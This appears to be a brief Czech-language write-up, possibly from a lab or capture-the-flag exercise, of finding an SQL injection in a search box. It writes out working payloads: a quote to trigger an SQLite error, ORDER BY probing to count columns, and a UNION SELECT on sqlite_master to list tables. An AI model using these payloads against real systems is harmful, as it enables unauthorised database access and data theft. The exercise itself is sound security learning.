# Do vyhledávání jsem zadal "'" a vyhodilo to "SQL Chyba: unrecognized token: "'"". Zranitelnost je v tom že input jde přímo do SQL dotazu.
# Do vyhledávání jsem psal "' ORDER BY 1--" a zvyšoval jsem to číslo dokud to nevyhodilo chybu. Tím jsem zjistil že to má 2 sloupce.
# Do vyhledávání jsem zadal "' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--" a zjistil tím názvy tabulek.
# 
